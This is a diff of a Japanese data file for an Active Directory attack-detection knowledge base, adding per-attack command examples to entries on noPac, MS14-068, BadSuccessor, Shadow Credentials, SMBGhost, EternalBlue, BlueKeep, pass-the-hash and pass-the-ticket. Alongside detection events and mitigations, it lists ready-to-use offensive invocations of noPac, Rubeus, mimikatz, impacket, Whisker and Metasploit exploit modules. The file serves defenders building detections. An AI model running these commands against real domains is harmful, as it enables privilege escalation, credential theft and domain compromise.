     "detect": "spoolsv.exeが子プロセスを生成、または非標準パスからDLLをロードする挙動をEDR/Sysmon(EventID 7 Image Load)で監視。PrintService Operationalログに外部ドライバ追加やUNCパス参照が記録される。DC上でのスプーラ稼働自体が要注意。",
     "events": "Microsoft-Windows-PrintService/Operational 316/808, Admin 808, 4697(サービスインストール), Sysmon 1/7/11, 4104",
     "mitigate": "最新パッチを適用。DC等の不要なホストでPrint Spoolerサービスを停止/無効化。レジストリでRestrictDriverInstallationToAdministratorsを1、NoWarningNoElevationOnInstallを0に設定しPoint and Printを厳格化する。",
@@ -4457,6 +7355,33 @@ AD.I18N.ja.attacks = [
     "summary": "マシンアカウント名の検証不備を突き、DC名になりすましたTGSを取得してDomain Admin相当に昇格する。",
     "how": "MachineAccountQuotaを利用しマシンアカウントを作成、その sAMAccountName をDC名(末尾の$を除いた形)に改名する。そのアカウントでTGTを取得後、アカウント名を元に戻す。TGT検証時にDCが該当アカウントを見つけられずDC$へフォールバックし、S4U2selfでDomain Adminを装ったサービスチケットを取得できる。低権限ドメインユーザとMAQ>0が前提。",
     "tools": "noPac.py(Ridter/Cube0x0)、sam_the_admin.py、impacket(getST/secretsdump)、Rubeus",
+    "cmd": [
+      {
+        "tool": "noPac",
+        "t": "マシンアカウント名をDC名へ一時改名しTGSを要求。`--impersonate`が特権狙いの典型的な痕跡",
+        "q": "noPac.py corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10 -dc-host dc01 --impersonate administrator"
+      },
+      {
+        "tool": "noPac",
+        "t": "対話シェル取得版。`-shell`でDC上にSYSTEM相当のプロセスを起動する",
+        "q": "noPac.py corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10 -dc-host dc01 -shell --impersonate administrator"
+      },
+      {
+        "tool": "noPac",
+        "t": "ハッシュ一括窃取版。`-dump`はDCSync相当でDC側4662と相関させて検知する",
+        "q": "noPac.py corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10 -dc-host dc01 --impersonate administrator -dump"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "MachineAccountQuota>0だと誰でも新規マシンアカウントを作れるため悪用前提の設定を確認",
+        "q": "Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2021年11月度修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB5007206"
+      }
+    ],
     "detect": "短時間でのマシンアカウント作成→改名→再改名のシーケンスを検知。sAMAccountNameが既存DC名と一致する変更、および末尾$の欠落を監視する。同一名でのTGT/TGS要求の食い違いも指標。",
     "events": "4741(コンピュータ作成), 4781(アカウント名変更), 4768/4769(Kerberos), 4662",
     "mitigate": "2021年11月パッチを全DCに適用。ms-DS-MachineAccountQuotaを0に設定し一般ユーザのマシンアカウント作成を禁止。4741/4781を監視し、DC名に酷似する改名を検知する。",
@@ -4497,6 +7422,28 @@ AD.I18N.ja.attacks = [
     "summary": "TGT内PACの署名検証欠陥を悪用し、任意グループ(Domain Admins)を主張する偽造PACでドメイン管理者に昇格する。",
     "how": "KDCがPACの署名にMD5等の非鍵付き/弱いチェックサムを受理する欠陥を利用。低権限ユーザの平文パスワードまたはハッシュがあれば、Domain Admins等の特権SIDを含む偽造PACを付けたTGTを生成し、任意サービスへ特権アクセスできる。ドメインユーザ1つの資格情報のみが前提。",
     "tools": "pykek(ms14-068.py)、impacket goldenPac.py、mimikatz(kerberos::ptt)",
+    "cmd": [
+      {
+        "tool": "pykek",
+        "t": "偽造PACを含むTGTを要求しccacheへ保存する原点ツール。ユーザSIDとDCの組み合わせが典型引数",
+        "q": "ms14-068.py -u svc_user@corp.local -s S-1-5-21-1111111111-2222222222-3333333333-1104 -d dc01.corp.local"
+      },
+      {
+        "tool": "Impacket",
+        "t": "偽造PAC発行からリモート実行までを一括化した後継ツール。target形式とcommand引数が残る",
+        "q": "goldenPac.py corp.local/svc_user:'Passw0rd!'@dc01.corp.local cmd.exe"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "pykek/goldenPacが出力したチケットをメモリへ注入。`kerberos::ptt`はチケット偽造系全般で共通の決定的シグナル",
+        "q": "mimikatz.exe \"kerberos::ptt ticket.ccache\" exit"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2014年11月度修正の適用有無を確認。非常に古いCVEのため未適用DCが残っていないか棚卸しする",
+        "q": "Get-HotFix -Id KB3011780"
+      }
+    ],
     "detect": "通常ありえないアカウントによる高権限アクセス、短時間発行のTGT、非標準ツールからのTGS要求を監視。PAC検証を有効化しKDCで整合性をチェックする。旧OSの残存DCが最大リスク。",
     "events": "4768, 4769, 4624, 4672",
     "mitigate": "MS14-068(2014年11月)を全DCへ適用。未適用DCが1台でも残ると全体が危殆化するため完全な適用確認が必須。RC4無効化とPAC検証強制も併用する。",
@@ -4537,6 +7484,28 @@ AD.I18N.ja.attacks = [
     "summary": "Windows Server 2025のdMSA移行機能を悪用する特権昇格。低権限ユーザがdMSAを新規作成し、任意特権アカウントの権限を継承したPACを取得してドメイン侵害できた。CVE-2025-53779として2025年8月12日にパッチ済みで一発の低権限→Domain Admin経路は封じられたが、技術は死んでおらず、WS2025 DCが1台でも存在する環境では、dMSA/標的オブジェクトへの書込権限を持つ攻撃者が任意のリンク先オブジェクトを乗っ取れるアカウント乗っ取りプリミティブとして存続する。",
     "how": "OU等に対しオブジェクト作成権限(Create Child)を持つ低権限ユーザがdMSAを新規作成し、msDS-ManagedAccountPrecededByLinkを標的(例: Domain Admin)へ、msDS-DelegatedMSAStateを2に設定する。移行完了を装うことでdMSAが標的の全権限を継承したPACを受け取り、さらにKDSルートキー経由でdMSAのパスワードをオフライン算出して継続的になりすませる。前提として環境にWS2025 DCが1台以上必要。パッチ前は前提がOU/コンテナへの作成権限のみで、既存アカウントへの書込権限は不要だった。2025年8月12日のパッチ(CVE-2025-53779、Windows Kerberos EoP/相対パストラバーサル)後は、KDCがチケット発行時に移行リンクの双方向性(相互ペアリング)を検証するため、dMSAから標的への一方向リンクだけでは昇格しない。ただし技術は死んでおらず、パッチ後のWS2025 DCでは『アカウント乗っ取りプリミティブ』として存続する: 標的オブジェクトのmsDS-SupersededManagedAccountLinkとmsDS-SupersededServiceAccountState(値2)へのWriteProperty/GenericWriteを保有すれば、dMSA側からの相互リンクと組み合わせて標的の全権限を継承でき、標的が特権アカウントなら依然としてDomain Adminへ到達し得る(Akamai追跡調査、SpecterOps『BadTakeover』BOF/パッチ後対応のSharpSuccessor、2025年10月)。",
     "tools": "SharpSuccessor(パッチ後のアカウント乗っ取りに対応)、BadTakeover BOF(SpecterOps、ネイティブLDAP APIベースのC2用BOF)、BadSuccessor PoC(Akamai/Yuval Gordon)、Rubeus、Certipy(補助)",
+    "cmd": [
+      {
+        "tool": "SharpSuccessor",
+        "t": "dMSAを新規作成し標的の権限継承リンクを設定するadd操作。`/impersonate`が昇格意図を示す決定的トークン",
+        "q": "SharpSuccessor.exe add /impersonate:Administrator /path:\"OU=Test,DC=corp,DC=local\" /account:svc_user /name:attacker_dmsa"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "dMSA属性を直接確認。`msDS-DelegatedMSAState`=2は移行完了、つまり権限継承成立を示す決定的な状態値",
+        "q": "Get-ADObject -LDAPFilter \"(objectClass=msDS-DelegatedManagedServiceAccount)\" -Properties msDS-ManagedAccountPrecededByLink,msDS-DelegatedMSAState"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "dMSA作成権限を持つ主体とOUを事前に洗い出す防御側スクリプト。攻撃面の把握に使う",
+        "q": "Get-BadSuccessorOUPermissions.ps1"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2025年8月12日パッチ(移行リンクの双方向性検証追加)の適用有無を確認",
+        "q": "Get-HotFix -Id KB5063878"
+      }
+    ],
     "detect": "dMSAオブジェクトの新規作成と、msDS-ManagedAccountPrecededByLink/msDS-DelegatedMSAState属性の変更を厳重監視。特にDomain Admin等の特権アカウントへのリンク設定が決定的シグナル。パッチ後のアカウント乗っ取り経路に備え、標的オブジェクト側のmsDS-SupersededManagedAccountLink/msDS-SupersededServiceAccountState(値2)への書込みも同様に監視する。dMSAによるTGT/TGS要求も監視する。WS2025 DCが存在する環境ほど優先度を上げる。",
     "events": "5137(オブジェクト作成), 5136(属性変更), 4662, 4769, 2946",
     "mitigate": "2025年8月12日のパッチ(CVE-2025-53779)を全DC、特にServer 2025 DCへ適用し対応ビルドへ更新する(kdcsvc.dllがチケット発行時に移行リンクの相互性を検証し、一方向リンクだけの昇格を封じる)。加えてOU/コンテナのCreate Child(特にmsDS-DelegatedManagedServiceAccount)権限を棚卸しし最小化、dMSA作成を管理者のみに制限する。msDS-ManagedAccountPrecededByLink/msDS-SupersededManagedAccountLink等の属性変更にアラートを設定し、委任ACLを厳格化する。パッチ後もWS2025 DCが存在する環境では、標的オブジェクトのmsDS-SupersededManagedAccountLink/StateへのWriteProperty/GenericWrite保有者によるアカウント乗っ取り余地(SpecterOps BadTakeover)が残るため、標的プリンシパル(特に特権アカウント)への書込権限の棚卸しも併せて実施する。プリミティブはWS2025 DCが1台以上必要なため、業務上不要ならWS2025 DCの導入を遅らせることも緩和策となる。",
@@ -4577,6 +7546,28 @@ AD.I18N.ja.attacks = [
     "summary": "特定権限を持つユーザがオブジェクトのセキュリティ記述子や資格情報属性を不正操作し特権認証へ悪用できる。",
     "how": "一部権限を持つ認証済みユーザが、コンピュータ/ユーザオブジェクトのセキュリティ記述子やmsDS-KeyCredentialLinkに対する書込みを悪用し、証明書ベースのShadow Credentials的な特権認証を成立させる。noPac/Certifried群と併用され横展開の起点になる。",
     "tools": "impacket、Whisker、pyWhisker、custom LDAPスクリプト",
+    "cmd": [
+      {
+        "tool": "Whisker",
+        "t": "標的オブジェクトへ`msDS-KeyCredentialLink`を追加。サブコマンド`add`と`/target`が残りやすい文字列",
+        "q": "Whisker.exe add /target:svc_user /domain:corp.local /dc:dc01.corp.local /path:cert.pfx /password:'Passw0rd!'"
+      },
+      {
+        "tool": "pywhisker",
+        "t": "Linux側からの同等操作。端末プロセスログは残らずLDAPの`msDS-KeyCredentialLink`書込みだけが痕跡になる",
+        "q": "pywhisker.py -d corp.local -u svc_user -p 'Passw0rd!' --target victim_user --action add"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "追加した証明書でPKINIT認証しNTハッシュを取得。`/getcredentials`がShadow Credentials特有の仕上げ操作",
+        "q": "Rubeus.exe asktgt /user:victim_user /certificate:cert.pfx /password:'Passw0rd!' /getcredentials /nowrap"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2021年11月度修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB5007206"
+      }
+    ],
     "detect": "msDS-KeyCredentialLink属性の予期しない書込みや、オブジェクトのセキュリティ記述子(nTSecurityDescriptor)変更を監視する。低権限アカウントによる特権オブジェクトへの書込みが指標。",
     "events": "5136(ディレクトリオブジェクト変更), 4662, 4768",
     "mitigate": "2021年11月パッチを適用。msDS-KeyCredentialLinkへの書込みACLを監査・最小化し、ADCS利用時は強力な証明書マッピングを強制する。",
@@ -4617,6 +7608,28 @@ AD.I18N.ja.attacks = [
     "summary": "SMBv3.1.1の圧縮処理における整数オーバーフローを突きリモートコード実行/権限昇格を行う。",
     "how": "SMBv3.1.1のSMB2_COMPRESSION_TRANSFORM_HEADER処理の整数オーバーフローを悪用。圧縮フラグを立てた不正メッセージで攻撃対象のカーネルメモリを破壊し、事前認証なしのRCEやローカルSYSTEM昇格を成立させる。445/TCP到達性が前提でワーム化も可能。AD環境ではDCやファイルサーバへの初期侵入・横展開に使われる。",
     "tools": "SMBGhost PoC(chompie1337 等)、Metasploit(cve_2020_0796)、danigargu exploit",
+    "cmd": [
+      {
+        "tool": "SMBGhost PoC",
+        "t": "圧縮ヘッダの整数オーバーフローを突く事前認証RCE。`-ip`のみを取る単純な引数が445への攻撃を示す",
+        "q": "python exploit.py -ip 10.0.0.20"
+      },
+      {
+        "tool": "Metasploit",
+        "t": "msfモジュール名`cve_2020_0796_smbghost`自体が識別子になる",
+        "q": "use exploit/windows/smb/cve_2020_0796_smbghost"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "SMBv3圧縮を無効化する回避策キーを確認。パッチ未適用環境での暫定緩和状態を見る",
+        "q": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v DisableCompression"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2020年3月度修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB4551762"
+      }
+    ],
     "detect": "SMB2圧縮ヘッダを含む異常パケットや、445番宛の異常トラフィックをIDS/IPSで検知。lsass/カーネルクラッシュやブルースクリーン、EDRのメモリ破壊検知が指標。",
     "events": "ネットワークIDSシグネチャ, System(クラッシュ/Bugcheck 1001), EDRテレメトリ",
     "mitigate": "2020年3月パッチを適用。暫定策としてDisableCompressionレジストリを1にしSMB圧縮を無効化。境界およびホスト間で445/TCPをブロックし、SMBv3.1.1の露出を減らす。",
@@ -4657,6 +7670,23 @@ AD.I18N.ja.attacks = [
     "summary": "サービスチケットの暗号文を改ざんし、forwardableフラグや保護ユーザ制限を回避して制約委任を悪用する。",
     "how": "制約委任を持つサービスアカウントのハッシュを保有する攻撃者が、S4U2self発行チケットのフラグ(forwardable)や『委任不可』/保護ユーザの制限を暗号文改ざんで無効化し、標的ユーザとして下流サービスへアクセスする。サービスアカウントの資格情報が前提。",
     "tools": "Rubeus(s4u /force-forwardable)、impacket getST.py",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "S4U2self発行チケットのforwardableフラグを暗号文改ざんで強制付与。`/bronzebit`が脆弱性名を冠する決定的トークン",
+        "q": "Rubeus.exe s4u /user:svc_websvc /rc4:<NTHASH> /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /bronzebit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同等機能をLinux側から実行。`-force-forwardable`が本脆弱性専用のオプション名",
+        "q": "getST.py -spn cifs/dc01.corp.local -impersonate administrator -force-forwardable corp.local/svc_websvc:'Passw0rd!'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2020年11月以降の累積更新適用有無を確認。KB番号はOS/更新チャネルごとに異なる点に注意",
+        "q": "Get-HotFix | Where-Object {$_.InstalledOn -gt '2020-11-01'} | Select-Object HotFixID,InstalledOn"
+      }
+    ],
     "detect": "S4U2self/S4U2proxyの異常な連鎖、委任不可であるべきアカウントに対する委任アクセスを監視する。単一サービスから多数の標的への偽装が指標。",
     "events": "4769, 4768, 4624",
     "mitigate": "2020年11月パッチと2021年強制モードを適用。特権アカウントを保護ユーザグループへ、機微アカウントに『委任不可(Sensitive)』フラグを設定。制約委任の構成を最小化する。",
@@ -4692,6 +7722,23 @@ AD.I18N.ja.attacks = [
     "summary": "事前認証が無効なアカウントに対しRC4-MD4の弱いASレスポンスからセッション鍵を復元しTGTを窃取する。",
     "how": "Kerberos事前認証(pre-authentication)が無効なアカウントを標的に、既知平文を含むAS-REPをRC4-MD4で強制し、ストリーム暗号の弱さからセッション鍵をオンライン復元。これによりTGTを取得しなりすます。認証情報なしでもDoNotRequirePreauthのアカウントがあれば成立する。",
     "tools": "Project Zero PoC(rc4_md4)、Rubeus/impacket(補助)",
+    "cmd": [
+      {
+        "tool": "CVE-2022-33679.py",
+        "t": "Project Zero研究ベースのPoC。事前認証なしでAS-REPからセッション鍵を復元しTGTを奪取、資格情報不要",
+        "q": "CVE-2022-33679.py -dc-ip 10.0.0.10 corp.local dc01.corp.local"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "DoNotRequirePreauthが有効なアカウントを棚卸し。本脆弱性成立の前提条件そのものを可視化する",
+        "q": "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2022年9月度修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB5017315"
+      }
+    ],
     "detect": "RC4(etype 23/-133等)を用いたAS-REQ/AS-REP、特に事前認証無効アカウントへの多数の要求を監視する。旧暗号スイートの利用自体が指標。",
     "events": "4768(暗号化タイプRC4), 4771, 4625",
     "mitigate": "2022年9月(9/13 Patch Tuesday)のパッチを適用(既定AES強制は2022/11/8以降の更新)。全アカウントでKerberos事前認証を必須化し、DoNotRequirePreauth設定を排除。RC4を無効化しAES限定へ移行する。2026年はCVE-2026-20833対応のKDC更新でRC4サービスチケット発行が段階的に廃止される(2026/1=監査/警告イベント→2026/4/14=既定AES-SHA1化・手動ロールバック可→2026/7=強制でロールバック不可)ため、msDS-SupportedEncryptionTypes未設定を含むRC4依存アカウントを事前に棚卸ししAES化しておく。",
@@ -4732,6 +7779,28 @@ AD.I18N.ja.attacks = [
     "summary": "SMBv1のバッファ処理欠陥を突く事前認証RCEで、AD環境内の横展開・ワーム伝播に多用される。",
     "how": "SMBv1のトランザクション処理欠陥を悪用し、445/TCPへ細工パケットを送ってカーネルメモリを破壊、事前認証なしのRCEを達成する。DoublePulsarインプラント設置後、ドメイン内の他ホストへ自動伝播しランサムウェア/横展開の基盤となる。SMBv1有効ホストが前提。",
     "tools": "Metasploit(ms17_010_eternalblue)、Fuzzbunch/DoublePulsar、AutoBlue",
+    "cmd": [
+      {
+        "tool": "Metasploit",
+        "t": "msfモジュール名`ms17_010_eternalblue`が識別子。既定は匿名ログインで445へ接続試行する",
+        "q": "use exploit/windows/smb/ms17_010_eternalblue"
+      },
+      {
+        "tool": "AutoBlue-MS17-010",
+        "t": "シェルコードを直接送り込む素のPoC実装。ターゲットIPとシェルコードファイルパスが引数に残る",
+        "q": "python eternalblue_exploit7.py 10.0.0.20 shellcode/sc_all.bin"
+      },
+      {
+        "tool": "AutoBlue-MS17-010",
+        "t": "攻撃前の脆弱性判定スキャン。偵察として本攻撃に先行することが多い",
+        "q": "python eternal_checker.py 10.0.0.20"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2017年3月度修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB4012212"
+      }
+    ],
     "detect": "SMBv1トラフィック、445番宛の異常スキャン/接続、DoublePulsarのSMBエコー応答を監視。ホスト間の急速な445接続増がワーム化の兆候。",
     "events": "System(SMBv1使用ログ), ネットワークIDSシグネチャ, 5140/5145",
     "mitigate": "MS17-010(2017年3月)を適用。SMBv1を全面無効化し、445/135-139を境界およびセグメント間でブロック。ネットワークセグメンテーションで横展開を抑止する。",
@@ -4767,6 +7836,23 @@ AD.I18N.ja.attacks = [
     "summary": "RDP(Terminal Services)の解放後使用欠陥を突く事前認証RCEで、AD端末/サーバへの初期侵入に使われる。",
     "how": "RDPの仮想チャネルMS_T120のUse-After-Free欠陥を悪用し、3389/TCPへ細工チャネル要求を送ってカーネル領域でコード実行する。事前認証・ワーム化可能でNLA未有効の旧OS(Win7/2008)が標的。侵入後にAD横展開の起点となる。",
     "tools": "Metasploit(cve_2019_0708_bluekeep_rce)、各種PoC",
+    "cmd": [
+      {
+        "tool": "Metasploit",
+        "t": "msfモジュール名`cve_2019_0708_bluekeep_rce`が識別子。3389への事前認証RCE試行",
+        "q": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2019年5月度修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB4499175"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "NLA(ネットワークレベル認証)の有効化状態を確認。無効なホストのみが無認証RCEの対象になる",
+        "q": "Get-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication"
+      }
+    ],
     "detect": "3389番宛の異常接続やMS_T120チャネル利用、RDPサービスのクラッシュ/再起動を監視する。外部露出RDPへのスキャンが前兆。",
     "events": "System(TermDD/RDPクラッシュ), 4625, ネットワークIDS",
     "mitigate": "2019年5月パッチを適用。NLA(ネットワークレベル認証)を有効化し、RDPをVPN/踏み台の背後に置く。不要な3389露出を排除しレガシーOSを撤去する。",
@@ -4802,6 +7888,23 @@ AD.I18N.ja.attacks = [
     "summary": "ローカルNTLM認証をSMBへリフレクションしファイル書込み等を悪用してSYSTEMへ権限昇格する。",
     "how": "ローカルで発生するNTLM認証を同一ホストのSMBサーバへリフレクションし、認証チャレンジのクロスプロトコル悪用で特権プロセスとして任意ファイル書込みを行いSYSTEM昇格する。ローカルの低権限実行権が前提で、AD端末での権限昇格・DLLハイジャックに繋がる。",
     "tools": "LocalPotato PoC、各種Potato系(RoguePotato/JuicyPotato亜種)",
+    "cmd": [
+      {
+        "tool": "LocalPotato",
+        "t": "SMB経路。同一ホストへのNTLMリフレクションでSYSTEM権限のファイル書込みを行う。`-i`/`-o`が典型引数",
+        "q": "LocalPotato.exe -i C:\\Temp\\evil.dll -o windows\\system32\\evil.dll"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "2023年1月度修正の適用有無を確認",
+        "q": "Get-HotFix -Id KB5022286"
+      },
+      {
+        "tool": "netstat",
+        "t": "Potato系はCOMサーバの既定TCPポート10271で待受するため固定ポートの有無を補助指標にする",
+        "q": "netstat -ano | findstr 10271"
+      }
+    ],
     "detect": "ローカルSMBループバック認証やCOM/RPCを介した特権プロセスの異常なファイル書込みを監視。system32等への予期しない書込みが指標。",
     "events": "4624(ローカルNTLM), Sysmon 11(FileCreate), 4688",
     "mitigate": "2023年1月パッチを適用。SMB署名を有効化し、EDRでNTLMリフレクション/任意ファイル書き込みの兆候を検知する(LocalPotatoはトークン操作型Potatoと異なり、ローカルNTLM認証リフレクションによるファイル書き込みプリミティブ)。最小権限運用とアプリケーション制御を徹底する。",
@@ -4842,6 +7945,28 @@ AD.I18N.ja.attacks = [
     "summary": "取得したNTLMハッシュを平文パスワードの代わりに使ってNTLM認証を成立させ、他ホストへ認証する。",
     "how": "mimikatz(sekurlsa::logonpasswords / sekurlsa::pth)やLSASSダンプ、DCSync、SAMダンプからNTハッシュを取得。前提はローカル/ドメイン管理者相当のハッシュとSMB(445)等への到達性。mimikatz sekurlsa::pth /user /domain /ntlm:<hash> /run:cmd で偽装トークンを生成し、impacketの-hashesオプションやNetExec(nxc smb <ip> -u user -H <hash>)で横展開する。ローカルAdministratorのハッシュ使い回しが典型的な悪用経路。",
     "tools": "mimikatz, impacket(psexec/wmiexec -hashes), NetExec, Metasploit psexec, pth-toolkit",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "NTLMハッシュを新規ログオンセッションに注入しcmdを子プロセス起動。mimikatzがlsass.exeを開くSysmon 10とプロセスツリーが相関の鍵",
+        "q": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:aabbccddeeff00112233445566778899 /run:cmd.exe\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "ハッシュのみでpsexec相当のサービス実行。PSEXESVCではなくランダム名のサービスを使うため名前ベース検知をすり抜け、7045のバイナリパスで見る",
+        "q": "psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:aabbccddeeff00112233445566778899 corp.local/administrator@10.0.0.10"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`-H`でハッシュ認証しSMB経由でログイン試行。既定のwmiexec方式ならWin32_Process生成が残り、失敗連続なら4625が積み上がる",
+        "q": "netexec smb 10.0.0.10 -u administrator -H aabbccddeeff00112233445566778899 -x whoami"
+      },
+      {
+        "tool": "pth-toolkit",
+        "t": "PtH専用winexe亜種。ADMIN$への書き込みと一時サービス起動はpsexec系と同じ痕跡でサービス名とバイナリパスで判別",
+        "q": "pth-winexe -U administrator%aabbccddeeff00112233445566778899 //10.0.0.10 cmd.exe"
+      }
+    ],
     "detect": "ログオンイベント4624でLogonType=3かつAuthenticationPackage=NTLM、LmPackageName='NTLM V1/V2'が管理者アカウントで多数ホストに出るパターンを監視。同一ワークステーション名から複数サーバへの短時間NTLM認証、LSASSへの異常アクセス(Sysmon EventID10, ターゲットlsass.exe)を検知する。",
     "events": "4624(LogonType 3/9), 4776, Sysmon 10(lsass access), 4672",
     "mitigate": "ローカル管理者パスワードをLAPSで一意化しハッシュ使い回しを封じる。Credential Guardでlsass資格情報を保護し、Protected Users グループ/管理階層(Tier)分離、SMB署名、Restricted Admin/リモートクレデンシャルガードを導入。ドメイン管理者のメンバサーバへの対話ログオンを禁止する。",
@@ -4882,6 +8007,38 @@ AD.I18N.ja.attacks = [
     "summary": "窃取または偽造したKerberos TGT/TGSチケットをメモリに注入して、パスワードやハッシュ無しでリソースへ認証する。",
     "how": "mimikatz sekurlsa::tickets /export や Rubeus dump/triage/monitor でメモリからTGT/TGSを抽出(.kirbi/ccache)。前提はチケット保持者のセッションへのアクセス。Rubeus ptt /ticket:<file> または mimikatz kerberos::ptt でチケットを現在セッションに注入し、そのままSMB/WinRM等へアクセス。Golden Ticket(krbtgtハッシュで偽造)やSilver Ticket(サービスアカウントハッシュで特定SPN偽造)もPtTの一形態として注入する。impactやLinuxではKRB5CCNAME環境変数でccacheを利用。",
     "tools": "Rubeus(dump/ptt), mimikatz(sekurlsa::tickets, kerberos::ptt), impacket(getST, -k -no-pass), ticketer.py",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "ログオン中の全チケットをLSA API経由で抽出。lsass.exeへのSysmon 10が出ずプロセス起動そのものが唯一の痕跡",
+        "q": "Rubeus.exe dump /nowrap"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "抽出済みチケットを現行セッションに注入。`ptt`と`/ticket:`の組み合わせがコマンドラインに残る直接痕跡",
+        "q": "Rubeus.exe ptt /ticket:C:\\\\Users\\\\Public\\\\ticket.kirbi"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "セッション内の全チケットを`.kirbi`としてディスクへ書き出す。大量`.kirbi`生成とlsass.exeへのSysmon 10が相関点",
+        "q": "mimikatz.exe \"sekurlsa::tickets /export\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "エクスポート済みチケットを注入しなりすまし。実行後は同一プロセスから異常なSPNへのTGS要求(4769)が続く",
+        "q": "mimikatz.exe \"kerberos::ptt ticket.kirbi\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "環境変数`KRB5CCNAME`でccacheを指定しパスワード無しで認証。攻撃元にログは残らずDCの4769だけが手掛かり",
+        "q": "KRB5CCNAME=administrator.ccache psexec.py -k -no-pass corp.local/administrator@dc01.corp.local"
+      },
+      {
+        "tool": "Impacket",
+        "t": "krbtgtハッシュから偽造TGTを生成しそのままPtTで利用。DCの4768/4769は正規発行と区別できずSID異常でのみ検知可能",
+        "q": "ticketer.py -nthash aabbccddeeff00112233445566778899 -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -domain corp.local Administrator"
+      }
+    ],
     "detect": "TGT-TGS要求(4768/4769)の異常: チケット暗号化タイプがRC4(0x17)なのに環境はAES、アカウント名とホスト名の不一致、既存TGTの有効期間外利用。Golden Ticketは存在しないアカウントや異常な有効期間(10年)を持つ。エンドポイントでのRubeus/mimikatz実行痕跡を監視。",
     "events": "4768, 4769, 4770, 4624(LogonType 3), 4672",
     "mitigate": "krbtgtパスワードを定期的に(2回連続)リセットしGolden Ticketを無効化。AES暗号化を強制しRC4を無効化、チケット有効期間を短縮。Protected Usersグループでチケット委任/RC4を禁止。特権アカウントのメンバサーバ露出を最小化する。",
@@ -4922,6 +8079,33 @@ AD.I18N.ja.attacks = [
     "summary": "NTLMハッシュやAESキーを使ってKerberos AS-REQを行い正規TGTを取得、以降Kerberosで横展開する(PtHとPtTの橋渡し)。",
     "how": "LSASSダンプ等でNTLMハッシュまたはAES128/256キーを取得(前提)。mimikatz sekurlsa::pth /user /domain /ntlm:<hash> /run:powershell、またはRubeus asktgt /user:<u> /rc4:<hash> (推奨: /aes256:<key>) でTGTを要求しメモリ注入。RC4よりAESキーを使うとイベント上の異常RC4痕跡を回避できる。取得したTGTでSMB/WMI/WinRMへKerberos認証する。impacketではgetTGT.py -hashes / -aesKey。",
     "tools": "Rubeus(asktgt), mimikatz(sekurlsa::pth), impacket getTGT.py",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "NTLMハッシュをKerberos長期鍵として注入しAS-REQで正規TGTを取得。4768のPreAuthTypeがRC4になる点が痕跡",
+        "q": "mimikatz.exe \"sekurlsa::pth /user:svc_user /domain:corp.local /ntlm:aabbccddeeff00112233445566778899 /run:powershell.exe\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "NTLMハッシュをRC4鍵としてAS-REQしTGTを直接取得・注入。`/rc4:`指定は4768のRC4暗号化フラグとして残る高信頼シグナル",
+        "q": "Rubeus.exe asktgt /user:svc_user /rc4:aabbccddeeff00112233445566778899 /domain:corp.local /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "AESキーでのAS-REQは通常運用と同じ暗号種別のためRC4偏り検知をすり抜ける。プロセス引数の`/aes256:`が数少ない痕跡",
+        "q": "Rubeus.exe asktgt /user:svc_user /aes256:aabbccddeeff0011aabbccddeeff0011aabbccddeeff0011aabbccddeeff0011 /domain:corp.local /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からNTLMハッシュでAS-REQしTGTを取得。攻撃元にログは無くDCの4768のみが手掛かり",
+        "q": "getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:aabbccddeeff00112233445566778899 corp.local/svc_user"
+      },
+      {
+        "tool": "Impacket",
+        "t": "AESキー指定でのAS-REQ。`-aesKey`使用時はRC4痕跡が出ず暗号種別ベースの検知条件から外れる",
+        "q": "getTGT.py -aesKey aabbccddeeff0011aabbccddeeff0011aabbccddeeff0011aabbccddeeff0011 corp.local/svc_user"
+      }
+    ],
